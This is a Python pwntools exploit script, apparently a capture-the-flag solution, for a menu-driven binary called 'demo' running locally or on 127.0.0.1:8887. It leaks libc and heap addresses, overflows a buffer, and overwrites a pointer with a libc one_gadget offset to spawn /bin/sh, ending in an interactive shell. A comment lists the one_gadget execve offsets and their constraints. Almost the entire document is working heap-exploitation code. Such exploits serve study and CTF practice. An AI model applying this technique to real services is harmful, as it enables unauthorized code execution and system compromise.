#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 1
shell = 0

if local:
	sh = process('./demo')
	bin = ELF('./demo')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	# libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
elif shell:
	sh = process('./test.sh', shell=True)
else:
	sh = remote('127.0.0.1',8887)
	bin = ELF('./test')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	#bin = ELF('')
	#libc = ELF('')


def zs(a=''):
	gdb.attach(target='xpwn', gdbscript=a, exe='./xpwn')
	if a == '':
		raw_input()
		
def z(a=''):
	gdb.attach(sh,a)
	if a == '':
		raw_input()

def edit(name=str, content=str):
    sh.recvuntil('Choice: ')
    sh.sendline('2')
    sh.recvuntil('edit')
    sh.sendline(name)
    sh.sendline(content)

def show(name=str):
    sh.recvuntil('Choice')
    sh.sendline('4')
    sh.recvuntil("MEME")
    sh.sendline(name)

def parse():
    sh.recvuntil("Choice")
    sh.sendline('1')

parse()
show("Project")
sh.recvuntil("Useless")
libc_addr = u64(sh.recv(6).ljust(8, b'\x00')) - 0x3C4B78 - 0x80
success("libc_addr:" + hex(libc_addr))
edit("Project2", 'a' * 0x80)
edit("Project2", "a")
show("Project2")
sh.recvuntil('a' * 0x80)
heap_addr = u64(sh.recvuntil('\x0a')[:-1].ljust(8, b'\x00'))
success("heap_addr:" + hex(heap_addr))
payload = "/bin/sh\x00"
payload += p64(libc_addr + 0xf1147)
payload = payload.ljust(0x1b0, 'a') + p64(heap_addr + 0x22d0 + 0x8)
edit("Project", payload)
edit("Project", 'a')
z('b *0x404227')
show("Project")
sh.interactive()

'''
$0x47 libcaddr

0x7f fff78f7 41d

0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''